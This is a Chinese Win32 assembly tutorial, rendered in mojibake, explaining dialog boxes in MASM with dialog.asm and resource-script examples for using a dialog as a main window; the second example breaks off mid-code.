å†…éƒ¨æœ‰ä¸€ä¸ªç®¡ç†ç¨‹åºï¼Œç”±å…¶æ¥å¤„ç†è±¡æŒ‰ä¸‹TABé”®åˆ™è¾“å…¥ç„¦ç‚¹ä»ä¸€ä¸ªå­çª—å£ç©ºé—´æ¡åˆ°å¦ä¸€ä¸ªå­çª—å£æ§ä»¶ã€æŒ‰ä¸‹ENTERé”®ç­‰äºåœ¨å½“ å‰å…·æœ‰è¾“å…¥ç„¦ç‚¹çš„å­çª—å£æ§ä»¶ä¸Šç‚¹å‡»äº†é¼ æ ‡ ç­‰ç­‰è¿™äº›æ‚äº‹ï¼Œè¿™æ ·ç¨‹åºå‘˜å°±å¯ä»¥é›†ä¸­ç²¾åŠ›äºä»–ä»¬çš„é€»è¾‘äº‹åŠ¡äº†ã€‚å¯¹è¯æ¡†ä¸»è¦ç”¨ ä½œè¾“å…¥è¾“å‡ºæ¥å£ï¼Œäººä»¬æ— é¡»çŸ¥é“å®ƒä»¬å†…éƒ¨çš„å·¥ä½œåŸç†ï¼Œè€Œåªè¦çŸ¥é“å¦‚ä½•å’Œä»–ä»¬è¿›è¡Œäº¤äº’å°±å¯ä»¥äº†ã€‚è¿™ä¹Ÿæ˜¯é¢å‘å¯¹è±¡è®¾è®¡ä¸­çš„ æ‰€è°“ä¿¡æ¯éšè—ã€‚åªè¦è¿™ä¸ªé»‘ç›’å­ä¸­çš„å®ç°è¶³å¤Ÿå®Œç¾ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ”¾å¿ƒåœ°ä½¿ç”¨ï¼Œå½“ç„¶æˆ‘ä»¬å¿…é¡»å¼ºè°ƒçš„æ˜¯â€œé»‘ç›’å­â€å¿…é¡»å®Œç¾ã€‚ WIN32 API å†…éƒ¨ çš„å®ç°å³æ˜¯ä¸€ä¸ªâ€œé»‘ç›’å­â€ã€‚ ç°åœ¨è®©æˆ‘ä»¬å›åˆ°æ­£é¢˜æ¥ï¼Œå¯¹è¯æ¡†çš„è®¾è®¡æ˜¯ä¸ºäº†å‡å°‘ç¨‹åºå‘˜çš„å·¥ä½œé‡çš„ï¼Œä¸€èˆ¬æ‚¨å¦‚æœåœ¨çª—å£ä¸­ è‡ªå·±æ”¾ä¸€ä¸ªå­çª—å£æ§ä»¶æ‚¨å°±å¿…é¡»è‡ªå·±å¤„ç†å…¶ä¸­çš„æŒ‰é”®é€»è¾‘å’Œç»†åˆ†ç±»å®ƒçš„çª—å£è¿‡ç¨‹ã€‚å¦‚æœæ‚¨æŠŠå®ƒæ”¾åˆ°å¯¹è¯æ¡†ä¸­ï¼Œåˆ™è¿™äº›æ‚äº‹ å¯¹è¯æ¡†ä¼šè‡ªå·±å¤„ç†ï¼Œæ‚¨åªè¦çŸ¥é“å¦‚ä½•è·å¾—ç”¨æˆ·è¾“å…¥çš„æ•°æ®å’Œå¦‚ä½•æŠŠæ•°æ®æ”¾å…¥åˆ°å­çª—å£æ§ä»¶ä¸­å»å°±å¯ä»¥äº†ã€‚ åœ¨ç¨‹åºä¸­å¯¹è¯æ¡†å’Œèœå•ä¸€æ ·è¢«å®šä¹‰æˆä¸€ç§èµ„æºï¼Œæ‚¨å¯ä»¥åœ¨è„šæœ¬æ–‡ä»¶ä¸­å†™ä¸€ä¸ªå¯¹è¯æ¡†æ¨¡æ¿ï¼Œå…¶ä¸­åŒ…å«è¯¥å¯¹è¯æ¡†å’Œå­çª—å£çš„ç‰¹æ€§ï¼Œ ç„¶åç”¨èµ„æºç¼–è¾‘å™¨ç¼–è¾‘ã€‚éœ€è¦æ³¨æ„çš„æ˜¯æ‰€æœ‰çš„èµ„æºå¿…é¡»æ”¾åœ¨åŒä¸€ä¸ªè„šæœ¬æ–‡ä»¶ä¸­ã€‚ è™½ç„¶å¯ä»¥ç”¨æ–‡æœ¬ç¼–è¾‘å™¨å»ç¼–è¾‘è„šæœ¬æ–‡ä»¶ï¼Œä½†æ˜¯è±¡è¦è°ƒæ•´å­çª—å£æ§ä»¶ä½ç½®æ—¶è¦æ¶‰åŠåˆ°ä¸€äº›åæ ‡å€¼æ—¶æœ€å¥½è¿˜æ˜¯ç”¨ä¸€äº›å¯è§†åŒ–çš„ç¼– è¾‘å™¨ï¼Œè¿™æ ·æ–¹ä¾¿å¤šäº†ã€‚ä¸€èˆ¬åœ¨ç¼–è¯‘å™¨çš„å¼€å‘åŒ…ä¸­éƒ½ä¼šå¸¦èµ„æºç¼–è¾‘å™¨ï¼Œæ‚¨å¯ä»¥ç”¨å®ƒä»¬æ¥äº§ç”Ÿä¸€ä¸ªæ¨¡æ¿ç„¶åå¢åˆ ä¸€äº›å­çª—å£æ§ä»¶ã€‚\nå¯¹è¯æ¡†çš„åˆ†ç±» æœ‰ä¸¤ç§ä¸»è¦çš„å¯¹è¯æ¡†ï¼šæ¨¡å¼å¯¹è¯æ¡†å’Œæ— æ¨¡å¼å¯¹è¯æ¡†ã€‚æ— æ¨¡å¼å¯¹è¯æ¡†å…è®¸æ‚¨æŠŠè¾“å…¥ç„¦ç‚¹åˆ‡æ¢åˆ°ï¼ˆåŒä¸€ä¸ªåº”ç”¨ç¨‹åºçš„ï¼‰å¦ä¸€ä¸ªçª—å£ï¼Œè€Œè¯¥å¯¹è¯æ¡†æ— é¡»å…³é—­ ã€‚æ¯”å¦‚WORD ä¸­çš„FINDå¯¹è¯æ¡†ã€‚æ¨¡å¼å¯¹è¯æ¡†åˆæœ‰ä¸¤ç±»ï¼šåº”ç”¨ç¨‹åºæ¨¡å¼å¯¹è¯æ¡†å’Œç³»ç»Ÿå¯¹è¯æ¡†ã€‚åº”ç”¨ç¨‹åºå¯¹è¯æ¡†ä¸å…è®¸æ‚¨åœ¨æœ¬ åº”ç”¨ç¨‹åºä¸­åˆ‡æ¢è¾“å…¥ç„¦ç‚¹ï¼Œä½†æ˜¯å¯ä»¥åˆ‡æ¢åˆ°å…¶å®ƒçš„åº”ç”¨ç¨‹åºä¸­å»ï¼Œè€Œç³»ç»Ÿå¯¹è¯æ¡†åˆ™å¿…é¡»æ‚¨å¯¹è¯¥å¯¹è¯æ¡†åšå‡ºå“åº”å¦åˆ™ä¸èƒ½åˆ‡æ¢åˆ° ä»»ä½•çš„åº”ç”¨ç¨‹åºä¸­å»ã€‚è¦åˆ›å»ºä¸€ä¸ªæ— æ¨¡å¼å¯¹è¯æ¡†è°ƒç”¨APIå‡½æ•°CreateDialogParamï¼Œè€Œåˆ›å»ºä¸€ä¸ªæ¨¡å¼å¯¹è¯æ¡†åˆ™è°ƒç”¨APIå‡½æ•°DialogBoxParamã€‚ å…¶ä¸­åº”ç”¨ç¨‹åºæ¨¡å¼å¯¹è¯æ¡†å’Œç³»ç»Ÿæ¨¡å¼å¯¹è¯æ¡†ä¹‹é—´çš„å·®åˆ«æ˜¯styleå‚æ•°ä¸åŒï¼Œè¦æƒ³åˆ›å»ºä¸€ä¸ªç³»ç»Ÿæ¨¡å¼å¯¹è¯æ¡†è¯¥å‚æ•°å¿…é¡»â€œorâ€ä¸Š DS_SYSMODALæ ‡å¿—ä½ã€‚åœ¨å¯¹è¯æ¡†ä¸­è‹¥è¦å’Œå­çª—å£æ§ä»¶é€šè®¯åˆ™è°ƒç”¨å‡½æ•°SendDlgItemMesageã€‚è¯¥å‡½æ•°çš„è¯­æ³•å¦‚ä¸‹ï¼š\n1 2 3 4 5 SendDlgItemMessage proto hwndDlg:DWORD,\\ idControl:DWORD,\\ uMsg:DWORD,\\ wParam:DWORD,\\ lParam:DWORD è¯¥APIå‡½æ•°å¯¹äºç”¨åœ¨å‘å­çª—å£æ§ä»¶å‘é€æ¶ˆæ¯æ–¹é¢æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚è­¬å¦‚:å¦‚æœæ‚¨æƒ³å¾—åˆ°editæ§ä»¶ä¸­çš„å­—ç¬¦ä¸²å¯ä»¥è¿™ä¹ˆåš:\n1 call SendDlgItemMessage, hDlg, ID_EDITBOX, WM_GETTEXT, 256, ADDR text_buffer å…·ä½“è¦å‘é€é‚£äº›æ¶ˆæ¯åº”å½“æŸ¥è¯¢æœ‰å…³çš„WIN32 API å‚è€ƒæ‰‹å†Œã€‚ WINDOWS è¿˜ æä¾›å‡ ä¸ªå¿«é€Ÿå­˜å–æ§ä»¶æ•°æ®çš„å‡½æ•°ã€‚è­¬å¦‚ï¼šGetDlgItemTextã€CheckDlgButtonç­‰ã€‚è¿™æ ·ä¸€æ¥ï¼Œæ‚¨å°±å¯ä»¥ä¸ç”¨å»æŸ¥è¯¢æ¯ä¸ªæ¶ˆæ¯çš„wParamå’ŒlParamå‚æ•°è·å¾—ç›¸å…³ä¿¡æ¯äº†ã€‚æ‚¨åº”å°½å¯èƒ½åœ°ä½¿ç”¨è¿™äº›API å‡½æ•°ï¼Œè¿™æ ·ä½¿å¾—æ‚¨çš„ä»£ç å°†æ¥æ¯”è¾ƒå®¹æ˜“ç»´æŠ¤ã€‚å¯¹è¯æ¡†çš„ç®¡ç†å‡½æ•°ä¼šæŠŠä¸€äº›æ¶ˆæ¯å‘é€ç»™ä¸€ä¸ªç‰¹å®šçš„å›è°ƒå‡½æ•°ï¼šå¯¹è¯æ¡†è¿‡ç¨‹å¤„ç†å‡½æ•°ï¼Œè¯¥å‡½æ•°çš„æ ¼å¼ä¸ºï¼š\n1 2 3 4 DlgProc proto hDlg:DWORD ,\\ iMsg:DWORD ,\\ wParam:DWORD ,\\ lParam:DWORD è¯¥å‡½æ•°çš„æ ¼å¼éå¸¸ç±»ä¼¼äºçª—å£çš„è¿‡ç¨‹å‡½æ•°ï¼Œé™¤äº†è¿”å›å€¼æ˜¯TUREå’ŒFALSEï¼Œè€Œä¸æ˜¯HRESULTï¼Œå­˜åœ¨äºWINDOWSå†…éƒ¨çš„å¯¹è¯æ¡†ç®¡ç†å™¨æ‰æ˜¯å¯¹è¯æ¡†çœŸæ­£çš„çª—å£è¿‡ç¨‹å‡½æ•°ã€‚å®ƒä¼šæŠŠæŸäº›æ¶ˆæ¯ä¼ é€’ç»™æˆ‘ä»¬çš„çª—å£è¿‡ç¨‹å‡½æ•°ã€‚æ‰€ä»¥å½“æˆ‘ä»¬çš„çª—å£è¿‡ç¨‹å‡½æ•°å¤„ç†è¿™äº›æ¶ˆæ¯æ—¶å°±è¿”å›TRUEï¼Œå¦åˆ™å°±åœ¨eaxä¸­è¿”å›FALSEã€‚è¿™ä¹Ÿæ„å‘³ç€æˆ‘ä»¬çš„çª—å£è¿‡ç¨‹å‡½æ•°åœ¨æ¥å—åˆ°è‡ªå·±ä¸å¤„ç†çš„æ¶ˆæ¯æ—¶å¹¶ä¸ä¼šè°ƒç”¨DefWindowProcå‡½æ•°ï¼Œå› ä¸ºå®ƒæœ¬èº«ä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„çª—å£è¿‡ç¨‹å‡½æ•°ã€‚å¯¹äºå¯¹è¯æ¡†æœ‰ä¸¤ç§ç”¨æ³•ï¼šä¸€ç§æ˜¯æŠŠå®ƒä½œä¸ºä¸€ä¸ªä¸»çª—å£æ¥ç”¨ï¼Œä¸€ç§æ˜¯æŠŠå®ƒä½œä¸ºä¸€ç§è¾“å…¥è¾“å‡ºè®¾å¤‡ä½¿ç”¨ã€‚è¿™æ¬¡æˆ‘ä»¬å°†ç¤ºèŒƒç¬¬ä¸€ç§ç”¨æ³•ã€‚â€œæŠŠå¯¹è¯æ¡†ç”¨ä½œä¸»çª—å£â€æœ‰ä¸¤ç§æ„æ€ï¼š\næ‚¨å¯ä»¥è°ƒç”¨RegisterClassExå‡½æ•°æŠŠå¯¹è¯æ¡†æ¨¡æ¿æ³¨å†Œä¸ºä¸€ä¸ªçª—å£ç±»ã€‚è¿™æ ·è¯¥å¯¹è¯æ¡†çš„è¡Œä¸ºå°±ç±»ä¼¼äºä¸€ä¸ªæ™®é€šçš„çª—å£äº†ï¼šå®ƒé€šè¿‡åœ¨æ³¨å†Œçª—å£æ—¶æŒ‡å®šçš„çª—å£è¿‡ç¨‹æ¥å¤„ç†æ‰€æœ‰çš„æ¶ˆæ¯ï¼Œé€šè¿‡è¿™ç§æ–¹æ³•æ¥ä½¿ç”¨å¯¹è¯æ¡†çš„å¥½å¤„æ˜¯æ‚¨ä¸éœ€è¦æ˜¾ç¤ºåœ°åˆ›å»ºå­çª—å£æ§ä»¶ï¼ŒWINDOWSæœ¬èº«ä¼šå¸®æ‚¨åˆ›å»ºå¥½ï¼Œå¦å¤–è¿˜ä¼šå¸®æ‚¨å¤„ç†æ‰€æœ‰çš„æŒ‰é”®é€»è¾‘ï¼Œå¦å¤–æ‚¨è¿˜å¯ä»¥æŒ‡å®šæ‚¨çª—å£ç±»ç»“æ„ä¸­çš„å…‰æ ‡å’Œå›¾æ ‡ï¼› æ‚¨çš„åº”ç”¨ç¨‹åºåˆ›å»ºæ²¡æœ‰çˆ¶çª—å£çš„å¯¹è¯æ¡†çª—å£ï¼Œè¿™ç§æ–¹æ³•ä¸­ï¼Œæ²¡æœ‰å¿…è¦éœ€è¦ä¸€æ®µå¤„ç†æ¶ˆæ¯å¾ªç¯çš„ä»£ç ï¼Œå› ä¸ºæ‰€æœ‰çš„æ¶ˆæ¯è¢«ç›´æ¥é€åˆ°å¯¹è¯æ¡†è¿‡ç¨‹å¤„ç†å‡½æ•°ï¼Œè¿™æ ·æ‚¨ä¹Ÿå¯ä»¥ä¸è¦æ³¨å†Œä¸€ä¸ªçª—å£ç±»ã€‚æˆ‘ä»¬å°†å…ˆä½¿ç”¨ç¬¬ä¸€ç§æ–¹æ³•ç„¶åä½¿ç”¨ç¬¬äºŒç§æ–¹æ³•ã€‚ ä¾‹å­ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 ;-------------------------------------------------------------------------------- ;dialog.asm ;-------------------------------------------------------------------------------- .386 .model flat,stdcall option casemap:none WinMain proto :DWORD,:DWORD,:DWORD,:DWORD include windows.inc include user32.inc include kernel32.inc includelib user32.lib includelib kernel32.lib .data ClassName db \u0026#34;DLGCLASS\u0026#34;,0 MenuName db \u0026#34;MyMenu\u0026#34;,0 DlgName db \u0026#34;MyDialog\u0026#34;,0 AppName db \u0026#34;Our First Dialog Box\u0026#34;,0 TestString db \u0026#34;Wow! I\u0026#39;m in an edit box now\u0026#34;,0 .data? hInstance HINSTANCE ? CommandLine LPSTR ? buffer db 512 dup(?) .const IDC_EDIT equ 3000 IDC_BUTTON equ 3001 IDC_EXIT equ 3002 IDM_GETTEXT equ 32000 IDM_CLEAR\tequ 32001 IDM_EXIT\tequ 32002 .code start: invoke GetModuleHandle,NULL mov hInstance,eax invoke GetCommandLine mov CommandLine,eax invoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT invoke ExitProcess,eax WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD LOCAL wc:WNDCLASSEX LOCAL msg:MSG LOCAL hDlg:HWND mov wc.cbSize,SIZEOF WNDCLASSEX mov wc.style,CS_HREDRAW or CS_VREDRAW mov wc.lpfnWndProc,offset WndProc mov wc.cbClsExtra,NULL mov wc.cbWndExtra,DLGWINDOWEXTRA push hInst pop wc.hInstance mov wc.hbrBackground,COLOR_BTNFACE+1 mov wc.lpszMenuName,offset MenuName mov wc.lpszClassName,offset ClassName invoke LoadIcon,NULL,IDI_APPLICATION mov wc.hIcon,eax mov wc.hIconSm,eax invoke LoadCursor,NULL,IDC_ARROW mov wc.hCursor,eax invoke RegisterClassEx,addr wc invoke CreateDialogParam,hInstance,addr DlgName,NULL,NULL,NULL mov hDlg,eax invoke ShowWindow,hDlg,SW_SHOWNORMAL invoke UpdateWindow,hDlg invoke GetDlgItem,hDlg,IDC_EDIT invoke SetFocus,eax .while TRUE invoke GetMessage,addr msg,NULL,0,0 .break .if (!eax) invoke IsDialogMessage,hDlg,addr msg .if eax==FALSE invoke TranslateMessage,addr msg invoke DispatchMessage,addr msg .endif .endw mov eax,msg.wParam ret WinMain endp WndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM .if uMsg==WM_DESTROY invoke PostQuitMessage,NULL .elseif uMsg==WM_COMMAND mov eax,wParam .if lParam==0 .if ax==IDM_GETTEXT invoke GetDlgItemText,hWnd,IDC_EDIT,addr buffer,512 invoke MessageBox,NULL,addr buffer,addr AppName,MB_OK .elseif ax==IDM_CLEAR invoke SetDlgItemText,hWnd,IDC_EDIT,NULL .else invoke DestroyWindow,hWnd .endif .else mov edx,wParam shr edx,16 .if dx==BN_CLICKED .if ax==IDC_BUTTON invoke SetDlgItemText,hWnd,IDC_EDIT,addr TestString .elseif ax==IDC_EXIT invoke SendMessage,hWnd,WM_COMMAND,IDM_EXIT,0 .endif .endif .endif .else invoke DefWindowProc,hWnd,uMsg,wParam,lParam ret .endif xor eax,eax ret WndProc endp end start 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ;-------------------------------------------------------------------------------- ;Dialog.rc ;-------------------------------------------------------------------------------- #include \u0026#34;c:\\masm32\\include\\RESOURCE.h\u0026#34; #define IDC_EDIT 3000 #define IDC_BUTTON 3001 #define IDC_EXIT 3002 #define IDM_GETTEXT 32000 #define IDM_CLEAR 32001 #define IDM_EXIT\t32003 MyDialog DIALOG 10,10,205,60 STYLE 0x0004 | DS_CENTER | WS_CAPTION | WS_MINIMIZEBOX | WS_SYSMENU | WS_VISIBLE | WS_OVERLAPPED | DS_MODALFRAME | DS_3DLOOK CAPTION \u0026#34;Our First Dialog Box\u0026#34; CLASS \u0026#34;DLGCLASS\u0026#34; { EDITTEXT IDC_EDIT, 15,17,111,13, ES_AUTOHSCROLL | ES_LEFT DEFPUSHBUTTON \u0026#34;Say Hello\u0026#34;, IDC_BUTTON, 141,10,52,13 PUSHBUTTON \u0026#34;E\u0026amp;xit\u0026#34;, IDC_EXIT, 141,26,52,13, WS_GROUP } MyMenu MENU { POPUP \u0026#34;Test Controls\u0026#34; { MENUITEM \u0026#34;Get Text\u0026#34;, IDM_GETTEXT MENUITEM \u0026#34;Clear Text\u0026#34;, IDM_CLEAR MENUITEM \u0026#34;\u0026#34;, , 0x0800 /*MFT_SEPARATOR*/ MENUITEM \u0026#34;E\u0026amp;xit\u0026#34;, IDM_EXIT } } åˆ†æï¼š æˆ‘ä»¬å…ˆæ¥åˆ†æç¬¬ä¸€ä¸ªä¾‹å­ï¼š è¯¥ä¾‹æ˜¾ç¤ºäº†å¦‚ä½•æŠŠä¸€ä¸ªå¯¹è¯æ¡†æ¨¡æ¿æ³¨å†Œæˆä¸€ä¸ªçª—å£ç±»ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªç”±è¯¥çª—å£ç±»æ´¾ç”Ÿçš„çª—å£ã€‚ç”±äºæ‚¨æ²¡æœ‰å¿…è¦è‡ªå·±å»åˆ›å»ºå­çª—å£æ§ä»¶ï¼Œæ‰€ä»¥å°±ç®€åŒ–äº†è®¸å¤šçš„å·¥ä½œã€‚ æˆ‘ä»¬å…ˆæ¥åˆ†æå¯¹è¯æ¡†æ¨¡æ¿ã€‚\n1 MyDialog DIALOG 10, 10, 205, 60 å…ˆæ˜¯å¯¹è¯æ¡†çš„åå­—ï¼Œç„¶åæ˜¯å…³é”®å­—DAILOGã€‚æ¥ä¸‹æ¥çš„å››ä¸ªæ•°å­—ä¸­ï¼Œå‰ä¸¤ä¸ªæ˜¯å¯¹è¯æ¡†çš„åæ ‡ï¼Œåä¸¤ä¸ªæ˜¯å¯¹è¯æ¡†çš„å®½å’Œé«˜ï¼ˆæ³¨æ„ï¼šå®ƒä»¬çš„å•ä½æ˜¯å¯¹è¯æ¡†çš„å•ä½ï¼Œè€Œä¸ä¸€å®šæ˜¯åƒç´ ç‚¹ï¼‰ã€‚\n1 STYLE 0x0004 | DS_CENTER | WS_CAPTION | WS_MINIMIZEBOX | WS_SYSMENU | WS_VISIBLE | WS_OVERLAPPED | DS_MODALFRAME | DS_3DLOOK ä¸Šé¢å®šä¹‰äº†å¯¹è¯æ¡†çš„é£æ ¼ã€‚\n1 CAPTION \u0026#34;Our First Dialog Box\u0026#34; è¿™æ˜¯æ˜¾ç¤ºåœ¨å¯¹è¯æ¡†æ ‡é¢˜æ¡ä¸Šçš„æ ‡é¢˜ã€‚\n1 CLASS \u0026#34;DLGCLASS\u0026#34; è¿™ä¸€è¡Œéå¸¸å…³é”®ã€‚æ­£æ˜¯æœ‰äº†å…³é”®å­—CLASSï¼Œæˆ‘ä»¬æ‰å¯ä»¥ç”¨å®ƒæ¥å£°æ˜æŠŠä¸€ä¸ªå¯¹è¯æ¡†å½“æˆä¸€ä¸ªçª—å£æ¥ç”¨ã€‚è·Ÿåœ¨å…³é”®å­—åé¢çš„æ˜¯â€œçª—å£ç±»â€çš„åç§°ã€‚\n1 2 3 4 5 { EDITTEXT IDC_EDIT, 15,17,111,13, ES_AUTOHSCROLL | ES_LEFT DEFPUSHBUTTON \u0026#34;Say Hello\u0026#34;, IDC_BUTTON, 141,10,52,13 PUSHBUTTON \u0026#34;E\u0026amp;xit\u0026#34;, IDC_EXIT, 141,26,52,13 } ä¸Šé¢çš„ä¸€å—å®šä¹‰äº†å¯¹è¯æ¡†ä¸­çš„å­çª—å£æ§ä»¶ï¼Œå®ƒä»¬æ˜¯å£°æ˜åœ¨{}ä¹‹é—´çš„ã€‚\n1 control-type \u0026#34;text\u0026#34; ,controlID, x, y, width, height [,styles] æ§ä»¶çš„ç±»å‹æ˜¯èµ„æºç¼–è¾‘å™¨å®šä¹‰å¥½äº†çš„å¸¸æ•°ï¼Œæ‚¨å¯ä»¥æŸ¥æ‰¾æœ‰å…³çš„æ‰‹å†Œã€‚ ç°åœ¨æˆ‘ä»¬æ¥çœ‹çœ‹æ±‡ç¼–æºä»£ç ã€‚å…ˆçœ‹è¿™éƒ¨åˆ†ï¼š\n1 2 mov wc.cbWndExtra,DLGWINDOWEXTRA mov wc.lpszClassName,OFFSET ClassName é€šå¸¸cbWndExtraè¢«è®¾æˆNULLï¼Œä½†æˆ‘ä»¬æƒ³æŠŠä¸€ä¸ªå¯¹è¯æ¡†æ¨¡æ¿æ³¨å†Œæˆä¸€ä¸ªçª—å£ç±»ï¼Œæˆ‘ä»¬å¿…é¡»æŠŠè¯¥æˆå‘˜çš„å€¼è®¾æˆDLGWINDOWEXTRAã€‚æ³¨æ„ç±»çš„åç§°å¿…é¡»å’Œæ¨¡æ¿ä¸­è·Ÿåœ¨CLASSå…³é”®å­—åé¢çš„åç§°ä¸€æ ·ã€‚ä½™ä¸‹çš„æˆå‘˜å˜é‡å’Œå£°æ˜ä¸€èˆ¬çš„çª—å£ç±»ç›¸åŒã€‚å¡«å†™å¥½çª—å£ç±»ç»“æ„å˜é‡åè°ƒç”¨å‡½æ•°RegisterClassExè¿›è¡Œæ³¨å†Œã€‚çœ‹ä¸Šå»è¿™ä¸€åˆ‡å’Œæ³¨å†Œä¸€ä¸ªæ™®é€šçš„çª—å£ç±»æ˜¯ä¸€æ ·çš„ã€‚\n1 invoke CreateDialogParam,hInstance,ADDR DlgName,NULL,NULL,NULL æ³¨å†Œå®Œæ¯•åï¼Œæˆ‘ä»¬å°±åˆ›å»ºè¯¥å¯¹è¯æ¡†ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬è°ƒç”¨å‡½æ•°CreateDialogParamäº§ç”Ÿä¸€ä¸ªæ— æ¨¡å¼å¯¹è¯æ¡†ã€‚è¿™ä¸ªå‡½æ•°å…±æœ‰5ä¸ªå‚æ•°ï¼Œå…¶ä¸­å‰ä¸¤ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ï¼šå®ä¾‹å¥æŸ„å’ŒæŒ‡å‘å¯¹è¯æ¡†æ¨¡æ¿åç§°çš„æŒ‡é’ˆã€‚æ³¨æ„ç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡å‘æ¨¡æ¿åç§°è€Œä¸æ˜¯ç±»åç§°çš„æŒ‡é’ˆã€‚è¿™æ—¶ï¼ŒWINDOWSå°†äº§ç”Ÿå¯¹è¯æ¡†å’Œå­æ§ä»¶çª—å£ã€‚åŒæ—¶æ‚¨çš„åº”ç”¨ç¨‹åºå°†æ¥æ”¶åˆ°ç”±WINDOWSä¼ é€çš„ç¬¬ä¸€ä¸ªæ¶ˆæ¯WM_CREATEã€‚\n1 2 invoke GetDlgItem,hDlg,IDC_EDIT invoke SetFocus,eax åœ¨å¯¹è¯æ¡†äº§ç”Ÿåï¼Œæˆ‘ä»¬æŠŠè¾“å…¥è¾“å‡ºç„¦ç‚¹è®¾åˆ°ç¼–è¾‘æ§ä»¶ä¸Šã€‚å¦‚æœåœ¨WM_CREATEæ¶ˆæ¯å¤„ç†æ®µä¸­å‡å¦‚è®¾ç½®ç„¦ç‚¹çš„ä»£ç ï¼ŒGetDlgItemå‡½æ•°å°±ä¼šå¤±è´¥ï¼Œå› ä¸ºæ­¤æ—¶ç©ºé—´çª—å£è¿˜æœªäº§ç”Ÿï¼Œä¸ºäº†åœ¨å¯¹è¯æ¡†å’Œæ‰€æœ‰çš„å­çª—å£æ§ä»¶éƒ½äº§ç”Ÿåè°ƒç”¨è¯¥å‡½æ•°æˆ‘ä»¬æŠŠå®ƒå®‰æ’åˆ°äº†å‡½æ•°UpdatWindowåï¼ŒGetDlgItemå‡½æ•°è¿”å›è¯¥æ§ä»¶çš„çª—å£å¥æŸ„ã€‚\n1 2 3 4 5 invoke IsDialogMessage, hDlg, ADDR msg .IF eax ==FALSE invoke TranslateMessage, ADDR msg invoke DispatchMessage, ADDR msg .ENDIF ç°åœ¨ç¨‹åºè¿›å…¥æ¶ˆæ¯å¾ªç¯ï¼Œåœ¨æˆ‘ä»¬ç¿»è¯‘å’Œæ´¾å‘æ¶ˆæ¯å‰ï¼Œè¯¥å‡½æ•°ä½¿å¾—å¯¹è¯æ¡†å†…ç½®çš„å¯¹è¯æ¡†ç®¡ç†ç¨‹åºæ¥å¤„ç†æœ‰å…³çš„é”®ç›˜è·³è½¬é€»è¾‘ã€‚å¦‚æœè¯¥å‡½æ•°è¿”å›TRUEï¼Œåˆ™è¡¨ç¤ºæ¶ˆæ¯æ˜¯ä¼ ç»™å¯¹è¯æ¡†çš„å·²ç»ç”±è¯¥å‡½æ•°å¤„ç†äº†ã€‚æ³¨æ„å’Œä¸Šç¯‡æ–‡ç« ä¸­ä¸åŒï¼Œå½“æˆ‘ä»¬æƒ³å¾—åˆ°æ§ä»¶çš„æ–‡æœ¬ä¿¡æ¯æ—¶è°ƒç”¨GetDlgItemTextå‡½æ•°è€Œä¸æ˜¯GetWindowTextå‡½æ•°ï¼Œå‰è€…æ¥å—çš„å‚æ•°æ˜¯ä¸€ä¸ªæ§ä»¶çš„ID å·ï¼Œè€Œä¸æ˜¯çª—å£çš„å¥æŸ„ï¼Œè¿™ä½¿å¾—åœ¨å¯¹è¯æ¡†ä¸­è°ƒç”¨è¯¥å‡½æ•°æ›´æ–¹ä¾¿ã€‚\nå¥½æˆ‘ä»¬ç°åœ¨ä½¿ç”¨ç¬¬äºŒç§æ–¹æ³•æŠŠä¸€ä¸ªå¯¹è¯æ¡†å½“æˆä¸€ä¸ªä¸»çª—å£æ¥ä½¿ç”¨ã€‚åœ¨æ¥ä¸‹æ¥çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†äº§ç”Ÿä¸€ä¸ªåº”ç”¨ç¨‹åºçš„æ¨¡å¼å¯¹è¯æ¡†ï¼Œæ‚¨å°†ä¼šå‘ç°å…¶ä¸­æ ¹æœ¬æ²¡æœ‰æ¶ˆæ¯å¾ªç¯æˆ–çª—å£å¤„ç†è¿‡ç¨‹ï¼Œå› ä¸ºå®ƒä»¬æ ¹æœ¬æ²¡æœ‰å¿…è¦ï¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 ;-------------------------------------------------------------------------------- ;dialog.asm (part 2) ;-------------------------------------------------------------------------------- .386 .model flat,stdcall option casemap:none DlgProc proto :DWORD,:DWORD,:DWORD,:DWORD include windows.inc include user32.inc include kernel32.inc includelib user32.lib includelib kernel32.lib .data DlgName db \u0026#34;MyDialog\u0026#34;,0 AppName db \u0026#34;Our Second Dialog Box\u0026#34;,0 TestString db \u0026#34;Wow! I\u0026#39;m in an edit box now\u0026#34;,0 .data? hInstance HINSTANCE ? CommandLine LPSTR ? buffer db 512 dup(?) .const IDC_EDIT equ 3000 IDC_BUTTON equ 3001 IDC_EXIT equ 3002 IDM_GETTEXT equ 32000 IDM_CLEAR\tequ 32001 IDM_EXIT\tequ 32002 .code start: invoke GetModuleHandle,NULL mov hInstance,eax invoke DialogBoxParam,hInstance,addr DlgName,NULL, addr DlgProc,NULL invoke ExitProcess,eax DlgProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM .if uMsg==WM_INITDIALOG invoke GetDlgItem,hWnd,IDC_EDIT invoke SetFocus,eax .elseif 